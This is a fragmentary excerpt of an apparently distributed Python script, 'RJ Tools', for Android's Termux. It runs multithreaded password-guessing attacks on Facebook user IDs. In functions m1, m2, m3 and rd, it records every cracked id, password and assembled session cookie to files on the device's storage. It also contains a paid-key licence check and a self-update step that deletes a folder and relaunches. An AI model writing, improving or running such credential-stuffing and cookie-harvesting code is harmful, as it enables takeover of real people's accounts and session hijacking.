...
def Setup():
	...
	try:
		...
		if '8.7.2' in httpx.get(url).text:
			...
			os.system('rm -rf New && python RJ.py')
...
xx=requests.get('https://github.com/SHANTO-KING/Approval/blob/main/Approval.txt').text.splitlines()
...
----------------------------------------------
 ...
 Version   : 0.01 \033[1;37m

 ok ids will be saved in RJ folder
...
try:
	...
	key1 = open('/data/data/com.termux/files/usr/bin/.mrRJxxx-cov', 'r').read()

except:

	kok=open('/data/data/com.termux/files/usr/bin/.mrRJxxx-cov', 'w');kok.write(myid);kok.close()

uid = os.getuid()

key1 = open('/data/data/com.termux/files/usr/bin/.mrRJxxx-cov', 'r').read()

kex=(f"RJ-XD{uid}TS{key1}110E==")
...
def apv():
	...
	try:
		...
		if kex in link:clear();main()
			...
			tks = ("Hi SHANTO KING Sir, I Need To Buy Your Paid RJ Tools Version 0.01 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

			subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

			print(' Run :  python RJ.py')
...
def file():
	...
	with tred(max_workers=20) as RJ:
		...
		for user in fo:
			...
			if mthd =='1':
				...
				RJ.submit(m1,ids,names,passlist,fbcr)

			elif mthd =='2':

				RJ.submit(m2,ids,names,passlist,fbcr)

			elif mthd =='3':

				RJ.submit(m3,ids,names,passlist,fbcr)
...
def m1(ids,names,passlist,fbcr):
	...
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [RJ-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [RJ-OK] '+ids+' | '+pas)

				oks.append(ids)

				open('/sdcard/RJ/RJ-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/RJ/RJ-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
...
def m2(ids,names,passlist,fbcr):
	...
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [RJ-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				open('/sdcard/RJ/RJ-M2-OK.txt','a').write(ids+'|'+pas+'\n')

				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice

				open('/sdcard/RJ/RJ-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
...
def m3(ids,names,passlist,fbcr):
	...
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [RJ-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				open('/sdcard/RJ/RJ-M3-OK.txt','a').write(ids+'|'+pas+'\n')

				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice

				open('/sdcard/RJ/RJ-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
...
def rd(ids,passlist,fbcr):
	...
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [RJ-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pas in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [RJ-OK] '+uid+' | '+pas)

				oks.append(ids)

				open('/sdcard/RJ/RJ-R-OK.txt','a').write(uid+'|'+pas+'\n')

				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice

				open('/sdcard/RJ/RJ-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
